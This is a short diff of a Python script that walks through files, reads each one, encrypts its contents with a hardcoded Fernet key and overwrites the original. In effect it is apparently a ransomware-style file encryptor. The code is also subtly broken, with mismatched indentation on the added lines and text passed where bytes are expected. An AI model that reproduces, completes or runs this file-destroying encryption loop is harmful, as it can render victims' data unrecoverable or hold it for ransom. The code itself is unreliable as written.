@@ -16,16 +16,19 @@ for xx in x :
                 print(ca)
                
                 dada = open(ca, 'r')
-                for xd in dada :
-                        xxd = xd
-                        key = Fernet.generate_key()
-                        f = Fernet(key)
-                        token = f.encrypt(xd)
-                        file =open(ca,'w')
-                        file.write(token)
+                
+                xd = dada.read()
+                key = Fernet.generate_key()
+                f = Fernet('pskwmwBip8DE8YcqP-oHvhSZG8GOZ0e9dEBqKavOejY=')
+                 token = f.encrypt(xd)
+                 file =open(ca,'w')
+                 file.write(token)
+                 
+                 
+                 
                       
                         
-                       
                         
                         
-                      
+                        
+                 
